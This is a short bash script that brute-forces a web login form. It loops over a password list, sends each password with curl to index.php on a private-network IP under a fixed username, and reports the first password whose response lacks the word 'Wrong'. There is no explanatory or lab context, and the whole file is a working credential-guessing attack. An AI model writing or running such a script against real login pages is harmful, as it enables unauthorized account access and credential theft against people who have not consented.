#! /bin/bash

ip="192.168.3.151"
username="furkan.paligu"

while IFS= read password
do
    command="$ip/index.php?username=$username&password=$password"
    attempt=$(curl -s $command | grep -oE "Wrong")
    if [[ $attempt == "Wrong" ]]
    then
        echo "Failed with: $password"
    else
        echo "Succeeded with: $password"
        break
    fi
done < password-list.txt
